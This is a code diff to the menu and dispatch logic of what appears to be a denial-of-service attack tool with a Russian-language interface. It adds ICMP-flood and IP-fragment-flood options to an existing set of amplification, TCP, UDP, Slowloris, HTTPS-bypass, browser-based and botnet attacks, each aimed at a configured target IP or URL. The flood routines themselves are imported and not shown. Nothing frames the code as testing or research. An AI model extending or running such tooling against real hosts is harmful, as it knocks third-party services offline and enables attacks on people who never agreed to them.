@@ -12,6 +12,7 @@ from rich.live import Live
 from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
 
 from config import update_config, CONFIG, setup_logging
+from attacks.layer3 import ICMPFloodAttack, IPFragmentFloodAttack
 from attacks.layer4 import AMPAttack, TCPAttack, UDPAttack, GameAttack, SpecialAttack, SlowLorisAttack
 from attacks.layer7 import TLSAttack, HTTPAttack, BrowserAttack, get_locust_attack
 from attacks.botnet import BotnetAttack
@@ -42,13 +43,16 @@ def choose_attack_method():
     table.add_row("", "HTTPS-FLOODER", "Классический HTTPS-флуд")
     table.add_row("", "LOCUST", "Атака с использованием Locust")
     table.add_section()
+    for category, methods in ATTACK_METHODS['L3'].items():
+        table.add_row(f"[bold]Layer 3 - {category}[/bold]", ", ".join(methods))
+    table.add_section()
     for category, methods in ATTACK_METHODS['L4'].items():
         table.add_row(f"[bold]Layer 4 - {category}[/bold]", ", ".join(methods))
     table.add_section()
     table.add_row("[bold]Botnet[/bold]", ", ".join(ATTACK_METHODS['L7']['BOTNET']))
     console.print(table)
     
-    all_methods = ["HTTPS-BYPASS", "HTTP-BROWSER", "HTTPS-FLOODER", "LOCUST", *ATTACK_METHODS['L4']['AMP'], *ATTACK_METHODS['L4']['TCP'], *ATTACK_METHODS['L4']['UDP'], *ATTACK_METHODS['L4']['GAME'], *ATTACK_METHODS['L4']['SPECIAL'], *ATTACK_METHODS['L7']['BOTNET']]
+    all_methods = ["HTTPS-BYPASS", "HTTP-BROWSER", "HTTPS-FLOODER", "LOCUST", *ATTACK_METHODS['L3']['FLOOD'], *ATTACK_METHODS['L4']['AMP'], *ATTACK_METHODS['L4']['TCP'], *ATTACK_METHODS['L4']['UDP'], *ATTACK_METHODS['L4']['GAME'], *ATTACK_METHODS['L4']['SPECIAL'], *ATTACK_METHODS['L7']['BOTNET']]
     return Prompt.ask("[bold cyan]Выберите метод атаки[/bold cyan]", choices=all_methods, default="HTTPS-BYPASS")
 
 def get_advanced_options(method):
@@ -116,6 +120,8 @@ def confirm_and_run(params, skip_confirm=False):
         'HTTP-BROWSER': lambda: BrowserAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTP-BROWSER', browser_type='playwright', behaviors=CONFIG['browser_behaviors']),
         'HTTPS-FLOODER': lambda: HTTPAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTPS-FLOODER'),
         'LOCUST': lambda: get_locust_attack()(CONFIG['target_url'], CONFIG['duration'], 'LOCUST-HTTP'),
+        'ICMP-FLOOD': lambda: ICMPFloodAttack(CONFIG['target_ip'], CONFIG['duration'], 'ICMP-FLOOD'),
+        'IP-FRAGMENT-FLOOD': lambda: IPFragmentFloodAttack(CONFIG['target_ip'], CONFIG['duration'], 'IP-FRAGMENT-FLOOD'),
         **{m: (lambda m: lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], m, CONFIG['duration']))(m) for m in ATTACK_METHODS['L4']['AMP']},
         **{m: (lambda m: lambda: TCPAttack(CONFIG['target_ip'], CONFIG['port'], CONFIG['duration'], m))(m) for m in ATTACK_METHODS['L4']['TCP']},
         **{m: (lambda m: lambda: UDPAttack(CONFIG['target_ip'], CONFIG['port'], CONFIG['duration'], m))(m) for m in ATTACK_METHODS['L4']['UDP']},
